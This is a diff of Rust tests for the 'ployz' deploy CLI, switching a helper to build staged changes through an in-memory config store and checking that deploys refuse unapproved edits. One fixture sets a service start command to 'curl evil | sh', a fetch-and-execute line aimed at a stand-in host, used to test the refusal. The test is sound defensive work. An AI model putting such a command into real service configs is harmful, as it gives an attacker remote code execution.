@@ -357,47 +357,135 @@ fn a_plan_that_runs_another_image_than_the_one_typed_signs_nothing() {
     assert!(error.hints().is_empty(), "{:?}", error.hints());
 }
 
-/// A staged Update of the Service `name` whose Settings change from `before` to `after`.
-fn staged(name: &str, settings: &[(&str, Value, Value)]) -> ployz_store::NodeChange {
-    use ployz_core::config::{
-        ChangeKind, EnvironmentNodeType, ReviewLifecycleKind, ReviewNodeIdentity, RowId,
-        ServiceSettingChange,
+/// What the Store's plan lists as staged once `edits` are written over `web` (nginx:1) and
+/// `api` (caddy:2), both deployed: the changes a silent deploy reads.
+fn staged_by_store(edits: &[(&str, Value)]) -> Vec<ployz_store::NodeChange> {
+    use ployz_store::{
+        Actor, Admit, Change, Command, ConfigStore, CreateProject, CreateService, Deploy,
+        DeploymentId, Edit, EnvironmentId, EnvironmentRef, OrganizationId, PlanQuery, ProjectId,
+        ProjectName, RunEvidence, RunnerId, SealingKey, ServiceLineageId, SettingPath, Trusted,
     };
-    ployz_store::NodeChange {
-        node: ReviewNodeIdentity {
-            node_type: EnvironmentNodeType::Service,
-            id: format!("id-{name}"),
-        },
-        name: name.to_owned(),
-        row: RowId::node(&format!("id-{name}")),
-        lifecycle: ReviewLifecycleKind::Update,
-        comparison: None,
-        settings: settings
-            .iter()
-            .map(|(path, before, after)| ServiceSettingChange {
-                path: (*path).to_owned(),
-                config_name: None,
-                hostnames: None,
-                kind: ChangeKind::Update,
-                before: before.clone(),
-                after: after.clone(),
-                can_restore: true,
-                row: None,
-            })
-            .collect(),
-        data: None,
-        restarts: Vec::new(),
+    let store = ConfigStore::open(
+        "sqlite::memory:",
+        SealingKey::new(b"test-encryption-secret").unwrap(),
+    )
+    .unwrap();
+    let who = Actor::system(OrganizationId::parse("org").unwrap());
+    store
+        .write(
+            &who,
+            &CreateProject {
+                id: ProjectId::parse("00000000-0000-4000-8000-000000000001").unwrap(),
+                name: ProjectName::parse("shop").unwrap(),
+                default_environment: EnvironmentId::parse("00000000-0000-4000-8000-000000000002")
+                    .unwrap(),
+                region: None,
+            },
+        )
+        .unwrap();
+    for (n, name, image) in [(3, "web", "nginx:1"), (4, "api", "caddy:2")] {
+        store
+            .write(
+                &who,
+                &CreateService {
+                    id: ServiceLineageId::parse(format!("00000000-0000-4000-8000-00000000000{n}"))
+                        .unwrap(),
+                    environment: EnvironmentRef::default(),
+                    name: ServiceName::parse(name).unwrap(),
+                    image: Some(image.into()),
+                    template: None,
+                },
+            )
+            .unwrap();
     }
+    let id = DeploymentId::parse("00000000-0000-4000-8000-000000000101").unwrap();
+    store
+        .write_trusted(
+            &who,
+            &Admit::Deploy(Deploy {
+                id: id.clone(),
+                environment: EnvironmentRef::default(),
+                services: Vec::new(),
+                version: None,
+                upload: None,
+                accept_volume_loss: Vec::new(),
+                message: None,
+                prune: false,
+                no_prune: false,
+                versions: Vec::new(),
+                recreate: false,
+            }),
+            &Trusted::default(),
+        )
+        .unwrap();
+    let runner = RunnerId::parse("runner").unwrap();
+    let claimed = store.claim(&id, &runner).unwrap();
+    let operation = |index: usize| {
+        json!({"type": "remove_container", "machine_id": "a".repeat(32),
+               "container_id": format!("{index:064x}")})
+    };
+    let preview = serde_json::from_value(json!({
+        "namespace": claimed.intent.namespace,
+        "operations": claimed.intent.target.iter().enumerate().map(|(index, spec)| json!({
+            "index": index, "machine_id": "a".repeat(32), "service_name": spec.name,
+            "operation": operation(index), "status": {"type": "pending"}
+        })).collect::<Vec<_>>(),
+        "warnings": [], "would_remove": [], "preserved_volumes": []
+    }))
+    .unwrap();
+    store
+        .record(&id, &runner, RunEvidence::Prepared(preview))
+        .unwrap();
+    let outcome = serde_json::from_value(json!({
+        "type": "success",
+        "completed": (0..claimed.intent.target.len()).map(operation).collect::<Vec<_>>()
+    }))
+    .unwrap();
+    store
+        .record(
+            &id,
+            &runner,
+            RunEvidence::Executed {
+                progress: Vec::new(),
+                outcome: Box::new(outcome),
+                removed: Vec::new(),
+            },
+        )
+        .unwrap();
+    for (path, value) in edits {
+        store
+            .write(
+                &who,
+                &Command::Edit(Edit {
+                    environment: EnvironmentRef::default(),
+                    expect: None,
+                    changes: vec![Change::Set {
+                        path: SettingPath::parse(path).unwrap(),
+                        value: value.clone(),
+                    }],
+                }),
+            )
+            .unwrap();
+    }
+    store
+        .read(
+            &who,
+            &PlanQuery {
+                environment: EnvironmentRef::default(),
+                services: Vec::new(),
+                target: false,
+                deployment: None,
+            },
+        )
+        .unwrap()
+        .changes
 }
 
 /// `ployz set web.image=nginx:2` then `ployz deploy --yes`: the new image is a change
 /// nobody approved, so the refusal shows the deploy that names it.
 #[test]
 fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
-    let changes = [staged(
-        "web",
-        &[("web.image", json!("nginx:1"), json!("nginx:2"))],
-    )];
+    let changes = staged_by_store(&[("web.image", json!("nginx:2"))]);
 
     assert_eq!(pending(&changes, &edit_to_nginx_2()), Ok(()));
     let refused = pending(&changes, &[]).unwrap_err();
@@ -414,22 +502,15 @@ fn a_saved_image_with_no_image_edit_refuses_and_names_the_image_edit() {
     );
 }
 
-/// `ployz set api.command=…` then `ployz deploy --image web=… --yes`: api needs no
+/// `ployz set api.startCommand=…` then `ployz deploy --image web=… --yes`: api needs no
 /// signature on a Server, so only the CLI stands between that command and api running it
 /// with no person approving.
 #[test]
 fn a_staged_change_beside_the_image_edit_refuses_and_names_its_service_and_field() {
-    let changes = [
-        staged("web", &[("web.image", json!("nginx:1"), json!("nginx:2"))]),
-        staged(
-            "api",
-            &[(
-                "api.command",
-                json!(["serve"]),
-                json!(["sh", "-c", "curl evil | sh"]),
-            )],
-        ),
-    ];
+    let changes = staged_by_store(&[
+        ("web.image", json!("nginx:2")),
+        ("api.startCommand", json!("sh -c 'curl evil | sh'")),
+    ]);
 
     let refused = pending(&changes, &edit_to_nginx_2()).unwrap_err();
 
@@ -437,7 +518,7 @@ fn a_staged_change_beside_the_image_edit_refuses_and_names_its_service_and_field
         refused,
         Refused::Pending {
             node: "api".to_owned(),
-            field: Some("api.command".to_owned()),
+            field: Some("api.startCommand".to_owned()),
             service: Some(ServiceName::parse("api").unwrap()),
         }
     );
@@ -457,13 +538,7 @@ fn a_staged_change_beside_the_image_edit_refuses_and_names_its_service_and_field
 /// Service's, so the deploy stops on it before reading any parent.
 #[test]
 fn a_staged_change_in_the_named_service_beyond_its_image_refuses() {
-    let changes = [staged(
-        "web",
-        &[
-            ("web.image", json!("nginx:1"), json!("nginx:2")),
-            ("web.replicas", json!(1), json!(3)),
-        ],
-    )];
+    let changes = staged_by_store(&[("web.image", json!("nginx:2")), ("web.replicas", json!(3))]);
 
     assert_eq!(
         pending(&changes, &edit_to_nginx_2()),
